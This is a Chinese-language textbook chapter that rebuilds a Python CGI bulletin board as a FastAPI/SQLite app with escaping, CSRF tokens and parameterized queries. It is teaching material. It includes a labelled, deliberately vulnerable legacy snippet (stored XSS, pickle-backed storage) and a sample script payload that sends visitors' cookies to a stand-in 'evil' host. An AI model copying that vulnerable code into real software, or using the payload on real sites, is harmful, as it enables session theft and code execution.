# 第 26 章 项目7：自建公告板（原书 pp.387-400）

> 一句话定位本章：把第 25 章的「远程编辑」扩展成一个**多人留言的公告板**——帖子、回复、持久化、多脚本协作；它也是全书**安全问题最集中**的一章（XSS、反序列化、无鉴权）。
> 基线：原书 Python 3.5；本目录按 3.12+ 校验。
> 对应英文章名：Project 7: Your Own Bulletin Board

### 26.2 原书的两处「时代性」风险

```python
# ❌ 历史对照：Python 3.13 上无法运行（cgi 已按 PEP 594 移除）
#    且下面三行都带有真实安全缺陷，仅供对照，切勿照抄
import cgi, shelve, sys, os
form = cgi.FieldStorage()
sender = form.getvalue("sender")
text = form.getvalue("text")

print("Content-type: text/html\n")
print(f"<p><b>{sender}</b> 说：{text}</p>")      # ← 用户输入直接进 HTML：存储型 XSS

db = shelve.open("data.dat")                      # ← pickle 后端：文件被篡改即可执行任意代码
db[str(len(db))] = {"sender": sender, "text": text}
```

三处必须记住的问题：

1. **存储型 XSS**：`text` 里放 `<script>fetch('//evil/?c='+document.cookie)</script>`，所有访客中招。这是本章**最严重**的缺陷，原书未作任何提示。
2. **`shelve` = `pickle`**：`shelve` 默认用 `pickle` 序列化值，反序列化不可信数据等同于执行任意代码。只要攻击者能写那个 `.dat` 文件（或共用服务器上的其他用户能），就完了。
3. **无鉴权、无 CSRF、无大小限制**：任何人可冒名发帖，且第三方页面可诱导提交。

### 26.4 初次实现：数据表与「列出 / 查看 / 保存」最小闭环

```python
# board_app.py —— 教学示意，不参与构建
# pip install fastapi uvicorn jinja2 python-multipart
# 运行：python board_app.py  → http://127.0.0.1:8000/
from __future__ import annotations

import secrets
import sqlite3
from contextlib import contextmanager
from datetime import datetime, UTC
from pathlib import Path

from fastapi import FastAPI, Form, HTTPException, Query
from fastapi.responses import HTMLResponse, RedirectResponse
from jinja2 import Environment, select_autoescape

DB_PATH = Path("board.db")
MAX_SUBJECT, MAX_TEXT = 120, 20_000
TOKENS: set[str] = set()

app = FastAPI(title="公告板")
env = Environment(autoescape=select_autoescape(["html"]), trim_blocks=True)

SCHEMA = """CREATE TABLE IF NOT EXISTS messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT, subject TEXT NOT NULL,
    sender TEXT NOT NULL, reply_to INTEGER REFERENCES messages(id),
    text TEXT NOT NULL, created_at TEXT NOT NULL)"""

@contextmanager
def db():
    conn = sqlite3.connect(DB_PATH); conn.row_factory = sqlite3.Row
    try:
        yield conn; conn.commit()
    finally:
        conn.close()

def new_token() -> str:
    token = secrets.token_urlsafe(32)        # 令牌用 secrets，不用 random
    TOKENS.add(token)
    return token

INDEX = """<!doctype html><meta charset="utf-8"><title>公告板</title>
<h1>公告板</h1><p><a href="/edit">发新帖</a></p>
<ol>{% for m in topics %}<li><a href="/view/{{ m['id'] }}">{{ m['subject'] }}</a>
    —— {{ m['sender'] }}（{{ m['created_at'] }}）</li>{% endfor %}</ol>"""

VIEW = """<!doctype html><meta charset="utf-8"><title>{{ topic['subject'] }}</title>
<h1>{{ topic['subject'] }}</h1>
<p><b>{{ topic['sender'] }}</b> 于 {{ topic['created_at'] }}</p><p>{{ topic['text'] }}</p>
<h2>回复（{{ replies | length }}）</h2>
<ul>{% for r in replies %}<li><b>{{ r['sender'] }}</b>：{{ r['text'] }}
    <small>{{ r['created_at'] }}</small></li>{% endfor %}</ul>
<p><a href="/edit?reply_to={{ topic['id'] }}">回复本帖</a> | <a href="/">返回</a></p>"""

EDIT = """<!doctype html><meta charset="utf-8"><title>发言</title>
<h1>{% if reply_to %}回复 #{{ reply_to }}{% else %}发新帖{% endif %}</h1>
<form action="/save" method="post">
  {% if not reply_to %}<p>标题：<input name="subject" maxlength="120" size="60"
      {% if quote %}value="{{ quote }}"{% endif %} required></p>{% endif %}
  <p>署名：<input name="sender" maxlength="40" required></p>
  <p><textarea name="text" rows="10" cols="70" required></textarea></p>
  <input type="hidden" name="reply_to" value="{{ reply_to or '' }}">
  <input type="hidden" name="token" value="{{ token }}"><button>提交</button></form>"""

@app.on_event("startup")
def _startup() -> None:
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute(SCHEMA)

@app.get("/", response_class=HTMLResponse)
def main_page() -> str:                                       # 26.5 的 main.cgi
    with db() as conn:
        topics = conn.execute(
            "SELECT * FROM messages WHERE reply_to IS NULL ORDER BY id DESC LIMIT 50").fetchall()
    return env.from_string(INDEX).render(topics=topics)

@app.get("/view/{mid}", response_class=HTMLResponse)
def view(mid: int) -> str:                                    # 26.5 的 view.cgi
    with db() as conn:
        topic = conn.execute("SELECT * FROM messages WHERE id = ?", (mid,)).fetchone()
        if topic is None:
            raise HTTPException(status_code=404, detail="主题不存在")
        replies = conn.execute(
            "SELECT * FROM messages WHERE reply_to = ? ORDER BY id", (mid,)).fetchall()
    return env.from_string(VIEW).render(topic=topic, replies=replies)

@app.get("/edit", response_class=HTMLResponse)
def edit(reply_to: int | None = Query(default=None),          # 26.5 的 edit.cgi
         quote: str = Query(default="")) -> str:
    return env.from_string(EDIT).render(reply_to=reply_to, quote=quote, token=new_token())

@app.post("/save")                                            # 26.5 的 save.cgi
def save(subject: str = Form(""), sender: str = Form(...), text: str = Form(...),
         reply_to: str = Form(""), token: str = Form("")) -> RedirectResponse:
    if token not in TOKENS:
        raise HTTPException(status_code=403, detail="CSRF 校验失败，请重试")
    TOKENS.discard(token)
    if len(text) > MAX_TEXT or len(subject) > MAX_SUBJECT:
        raise HTTPException(status_code=413, detail="内容过长")
    parent: int | None = int(reply_to) if reply_to.isdigit() else None
    if parent is None:
        subject = subject.strip() or "(无标题)"
    else:
        with db() as conn:
            row = conn.execute("SELECT subject FROM messages WHERE id = ?", (parent,)).fetchone()
        if row is None:
            raise HTTPException(status_code=400, detail="回复的主题不存在")
        subject = row["subject"]
    with db() as conn:
        # 参数化查询：SQL 注入的唯一正解，绝不 f-string 拼 SQL
        cur = conn.execute(
            "INSERT INTO messages (subject, sender, reply_to, text, created_at)"
            " VALUES (?, ?, ?, ?, ?)",
            (subject, sender[:40], parent, text, datetime.now(UTC).isoformat(timespec="seconds")))
        new_id = cur.lastrowid
    return RedirectResponse(url=f"/view/{parent or new_id}", status_code=303)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8000)
```

> `@app.on_event("startup")` 在新版 FastAPI 中已倾向用 `lifespan` 上下文管理器替代；🔧 具体 API 以所用版本的官方文档为准。

### 26.5 再次实现：四个入口的对照

| 原书脚本 | 本章对应 | 该入口要校验什么 |
| --- | --- | --- |
| `main.cgi` | `GET /` | 只读，无用户输入 → 只需限制条数（分页） |
| `view.cgi` | `GET /view/{mid}` | `mid` 必须是整数（框架已做），不存在返回 404 而非 500 |
| `edit.cgi` | `GET /edit` | `reply_to` 必须指向真实主题；`quote` 是回显参数，**必须转义** |
| `save.cgi` | `POST /save` | CSRF token、字段长度、父主题存在性、参数化 SQL |

原书的"尝试使用"环节是启动一个 CGI 服务器（`python -m http.server --cgi`）后连点几个页面；2026 年的等价动作是 `python board_app.py` 或 `pytest` 跑接口测试。

### 26.6 进一步探索与「2026 年等价做法」

| 方向 | 做法 |
| --- | --- |
| 鉴权 | 登录态；发帖绑定 `user_id` 而非自由填写 `sender` |
| 富文本 | 若允许 Markdown，用白名单渲染器净化 HTML，仍是转义优先 |
| 检索与防刷 | SQLite FTS5 全文索引；限流（每 IP 每分钟 N 帖）+ 验证码 |
| 测试与选型 | `TestClient` 覆盖「发新帖 → 回复 → 查看」；正式项目用 PostgreSQL/MySQL |

| 原书环节 | 原书做法 | 2026 年等价做法 |
| --- | --- | --- |
| 请求解析 | `cgi.FieldStorage` | FastAPI `Form` / Pydantic 模型 |
| 存储 | `shelve`（pickle） | `sqlite3`（参数化查询）或 ORM（SQLAlchemy/Django ORM） |
| 渲染 | 字符串拼接 HTML | Jinja2 autoescape |
| 部署 | CGI | ASGI（uvicorn）/ WSGI（PEP 3333）+ 反向代理 |

## 近年研究与工业界开源实践（2015–2026）

- **Django**：自带 CSRF 中间件、ORM、用户体系与模板自动转义——本章若要用框架，Django 是「安全默认值最全」的选择。
- **FastAPI**：类型驱动的校验与自动文档；安全能力（CSRF、鉴权）需自行装配。
- **SQLAlchemy / Django ORM**：把「参数化查询」变成默认行为，从根上消灭字符串拼 SQL。
- **`bleach` / `nh3`**：HTML 净化库，用于「必须允许部分标签」的富文本场景；默认仍应是转义。
- **`defusedxml` / `bandit` / `ruff` 安全规则**：前者提醒了一条通用原则——**反序列化/解析不可信数据必须加固**（`pickle`/`shelve` 最危险）；后两者能在 CI 里拦下 `pickle.load`、`eval`、拼 SQL 等模式。
- **研究与实践侧**：XSS 与注入的防御研究重心在「上下文敏感的输出编码」与「可信类型（Trusted Types）」；工业界共识是**默认转义 + 白名单净化**，而非黑名单过滤。🔧 OWASP 文档为行业共识文档，非同行评审论文。

## 常见误区与本书需修正之处

| # | 原书写法 / 常见误区 | 问题 | 2026 年正确写法 |
| --- | --- | --- | --- |
| 1 | 🔴 把用户输入直接拼进 HTML | **存储型 XSS**（本章最严重缺陷，原书未提示） | Jinja2 autoescape / `html.escape` |
| 2 | 🔴 `shelve.open()` 存帖子 | `pickle` 反序列化不可信数据 = 任意代码执行 | `sqlite3` + 参数化查询，或 ORM |
| 3 | 🔴 `import cgi` | 3.13 已移除（PEP 594） | FastAPI / Flask + ASGI / WSGI |
| 4 | 🔧 无 CSRF 防护 | 第三方站点诱导发帖 | 一次性 token（`secrets.token_urlsafe`） |
| 5 | 🔧 无鉴权，署名随意填 | 冒名发帖、无法追责 | 登录态，`sender` 取会话中的用户 |
| 6 | 🔧 SQL 用字符串拼接 | SQL 注入 | `?` 占位符参数化查询 |
| 7 | 🔧 边界情况未处理：主题不存在、内容超长 | 500 + 泄露栈；存储与渲染被打爆 | 显式 404；字段长度上限（示例中 20 000 字符） |
| 8 | 认为「转义了就万事大吉」 | JS 上下文、URL 上下文需各自编码 | 按输出上下文选择编码策略 |
| 9 | 🔧 用 `cgitb` 在生产暴露栈 | 泄露路径与版本 | 生产通用错误页 + `logging` 审计 |
